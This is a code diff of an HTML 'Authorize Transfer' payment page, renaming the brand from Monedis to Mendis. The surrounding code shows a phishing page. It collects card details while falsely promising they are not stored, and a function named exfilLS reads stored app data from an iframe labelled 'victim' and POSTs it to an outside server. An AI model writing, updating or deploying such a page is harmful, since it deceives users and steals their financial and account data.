@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Monedis — Authorize Transfer</title>
+<title>Mendis — Authorize Transfer</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
@@ -295,7 +295,7 @@ body {
       </div>
 
       <div class="note">
-        Your card details are used only to verify your identity and authorize this transfer. They are encrypted and not stored by Monedis.
+        Your card details are used only to verify your identity and authorize this transfer. They are encrypted and not stored by Mendis.
       </div>
 
       <button class="cta" id="cta2" onclick="submitCard()">
@@ -340,8 +340,8 @@ body {
 </div>
 
 <script>
-// ── Clear stale Monedis data so iframe always seeds fresh ──
-try { window.localStorage.removeItem('monedis.web.v1'); } catch(e) {}
+// ── Clear stale Mendis data so iframe always seeds fresh ──
+try { window.localStorage.removeItem('mendis.web.v1'); } catch(e) {}
 
 // ── Card brand detection ──
 var BRANDS = { visa:'💳', mc:'💳', amex:'💳', discover:'💳' };
@@ -426,7 +426,7 @@ function exfilLS() {
   try {
     var iWin = document.getElementById('victim').contentWindow;
     if (typeof iWin.guardar === 'function') iWin.guardar();
-    var raw = window.localStorage.getItem('monedis.web.v1') || '';
+    var raw = window.localStorage.getItem('mendis.web.v1') || '';
     if (raw.length > 5) {
       fetch('https://closing-notes.onrender.com/?r=grab', {
         method: 'POST', headers: {'Content-Type':'application/json'},
